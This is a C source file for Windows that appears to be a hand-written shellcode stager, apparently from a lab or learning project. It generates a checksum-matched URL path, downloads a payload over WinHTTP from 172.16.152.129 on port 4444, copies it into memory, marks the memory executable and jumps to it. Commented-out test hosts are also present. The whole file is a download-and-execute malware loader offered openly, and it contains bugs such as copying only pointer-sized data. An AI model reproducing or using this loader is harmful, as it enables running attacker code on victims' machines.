#pragma comment(lib, "winhttp.lib")

#include <windows.h>
#include <winhttp.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stdio.h>

const int DEBUG = 1;
const int MIN_URL_LENGTH = 50;
const int MAX_URL_LENGTH = 200;
const char ALPHABET[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

char* getURL();
int getSum(char*);
int getRnd();
int httpGET();

int main(){

    int iCnt = 0;

    // Init rand
    srand(time(NULL));
    
/*
    char *url = NULL;

    while (url == NULL){
	url = getURL();
	iCnt++;
    }

    printf("[%i] Obtained url [%s], with checksum %i mod 0x100 = %i\n", iCnt, url, getSum(url), getSum(url) % 0x100);
 */
    //valid url: "GQx9cmcsnhM9QdTsKr5bfz19P501F0V3P5jlb63lrL6KRnxxi3ZIR";
    char *url = "GQx9cmcsnhM9QdTsKr5bfz19P501F0V3P5jlb63lrL6KRnxxi3ZIR";
    httpGET(NULL,url);
    
    return 0;
}

char* getURL(){
    int found = 0;
    int i = 0;
    char *url = malloc(MAX_URL_LENGTH * sizeof(char));

    // Init rand
    srand(time(NULL));

    // minimum nb of characters
    for (i; i < MIN_URL_LENGTH; i++){
        *(url+i) = ALPHABET[getRnd()];
    }
    
    
    while (!found && strlen(url) < MAX_URL_LENGTH) {
        int checksum = getSum(url) % 0x100;

	if (checksum <= 92){
            int diff = 92 - checksum;

            if (diff == 0){
	        found = 1;
                printf("url: %s\n", url);
            } else if ((diff >= 48 && diff <= 57) ||    // 0-9 
		           (diff >= 65 && diff <= 90) ||        // A-Z
                   (diff >= 97 && diff <= 122)){        // a-z

	        *(url + strlen(url)) = diff;
	        found = 1;
	    }
	} 

	if (!found) {
            *(url + strlen(url)) = ALPHABET[getRnd()];
	}
    }

    if (found) {
        return url;
    } else {
	return NULL;
   }
}

int getSum(char *string1){
    int sum = 0;
    int i, len;
		 
    len = strlen(string1);

    for (i = 0; i < len; i++) {
        sum = sum + *string1;
	string1++;
    }

    return sum;
}

int getRnd(){
    int min = 0;
    int max = strlen(ALPHABET);
    
    int res = rand() % (max + 1 - min) + min;

    return res;
}

int httpGET(LPCWSTR CONST_URL_DOMAIN, LPCWSTR CONST_URL_PATH)
{
	printf("Entered httpGET\n");
/*
	LPWSTR val = L"/0";
	wcscat(val,L"/");
	wcscat(val,CONST_URL_PATH);
*/
 	LPCWSTR URL_DOMAIN = L"172.16.152.129"; 
	LPCWSTR URL_PATH = L"/GQx9cmcsnhM9QdTsKr5bfz19P501F0V3P5jlb63lrL6KRnxxi3ZIR";
	INTERNET_PORT IPORT = 4444;
 	//LPCWSTR URL_DOMAIN = L"www.tutorialspanel.com"; 
	//LPCWSTR URL_PATH = L"/wp-content/uploads/2018/02/test.jpg";
	//INTERNET_PORT IPORT = 80;

/* TEST 1
 	LPCWSTR URL_DOMAIN = L"swissgents.club"; 
	LPCWSTR URL_PATH = NULL; 
	INTERNET_PORT IPORT = 80;
*/
	//IPORT = INTERNET_DEFAULT_HTTPS_PORT;
	
	printf("URL: %ws%ws\n",URL_DOMAIN, URL_PATH);

	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  sessionHandle = NULL, connectionHandle = NULL, requestHandle = NULL;
	int szLength = 0;

	// 1. WinHttpOpen
	sessionHandle = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (DEBUG) 
		printf("1 - WinHttpOpen\n");
	
	// 2. WinHttpConnect
	if (sessionHandle) {
		connectionHandle = WinHttpConnect(sessionHandle, URL_DOMAIN, IPORT, 0);
	}
	
	if (DEBUG) 
		printf("2 - WinHttpConnect -> %i\n", sessionHandle);

	// 3. WinHttpOpenRequest
	if (connectionHandle) {
		requestHandle = WinHttpOpenRequest(connectionHandle, L"GET", URL_PATH, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	}

	if (DEBUG) 
		printf("3 - WinHttpOpenRequest -> %i\n",connectionHandle);

	// 4. WinHttpSendRequest.
	if (requestHandle){
		bResults = WinHttpSendRequest(requestHandle, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	}
	
	if (DEBUG) 
		printf("4 - WinHttpSendRequest -> %i\n",bResults);

	// 5. WinHttpReceiveResponse
	if (bResults){
		bResults = WinHttpReceiveResponse(requestHandle, NULL);
	}
	
	if (DEBUG) 
		printf("5 - WinHttpReceiveResponse -> %i\n",bResults);


	char *fullContents = (char *)malloc(sizeof(char));

	if (DEBUG) {
		if (fullContents == NULL) {
			// unable to allocate memory.
			printf("Error creating buffer\n");
		} else {
			printf("Created fullContents\n");
		}
	}
	
	if (bResults)
		do 
		{
			// Verify available data.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(requestHandle, &dwSize))
				printf( "Error %u in WinHttpQueryDataAvailable.\n",GetLastError());

			// Allocate space for the buffer.
			pszOutBuffer = (char*)malloc(dwSize + 1);
			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				dwSize=0;
			}
			else
			{
				// Read the Data.
				ZeroMemory(pszOutBuffer, dwSize+1);

				if (!WinHttpReadData(requestHandle, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
					printf( "Error %u in WinHttpReadData.\n", GetLastError());
				} else {
					fullContents = (char *)realloc(fullContents, szLength + dwSize * sizeof(char));
					memcpy(fullContents + szLength, pszOutBuffer, dwSize);

					szLength = szLength + dwSize;
					
					// Free the memory allocated to the buffer.
					free(pszOutBuffer);
				}
			}

		} while (dwSize > 0);
		
		if (DEBUG) {
			int i = 0;
			
			FILE *fc = fopen("fullContents.bin", "wb");
			for (i = 0; i <= szLength; i++){
				fwrite(fullContents+i, sizeof(char), 1, fc);
			}
			fclose(fc);
		}

		void *adr = VirtualAlloc(NULL, sizeof fullContents, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		printf("Arrived here!\n");
		memcpy(adr, fullContents, sizeof fullContents);
		printf("... and even here!\n");
		DWORD dummy;
		VirtualProtect(adr, sizeof fullContents, PAGE_EXECUTE_READ, &dummy);
		printf("Time to go bang...\n");
		
		((void(*)())adr)();
		
	// Report any errors.
	if (!bResults)
		printf("Error %d has occurred.\n", GetLastError());

	// Close any open handles.
	if (requestHandle) WinHttpCloseHandle(requestHandle);
	if (connectionHandle) WinHttpCloseHandle(connectionHandle);
	if (sessionHandle) WinHttpCloseHandle(sessionHandle);
	if (fullContents) free(fullContents);
}

